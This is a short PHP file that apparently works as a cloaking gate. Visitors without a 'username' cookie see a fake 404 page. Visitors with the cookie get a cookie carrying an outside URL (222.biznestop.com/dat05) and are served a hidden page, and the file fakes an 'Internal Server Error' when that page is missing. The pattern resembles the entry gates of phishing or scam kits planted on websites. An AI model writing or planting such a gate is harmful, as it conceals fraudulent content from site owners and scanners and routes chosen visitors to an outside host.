<?php
define('ROOT_DIR', dirname(__FILE__));
$tzurl = "https://222.biznestop.com/dat05";
$includefile = 'six/404.html';
if(!empty($_COOKIE['username'])){
setcookie('tzname',$tzurl, 0);
$includefile = 'six/s1.html';
}

if(@!file_exists($includefile)) {
	echo 'Internal Server Error';
	exit;
}else{
	include $includefile;
}


?>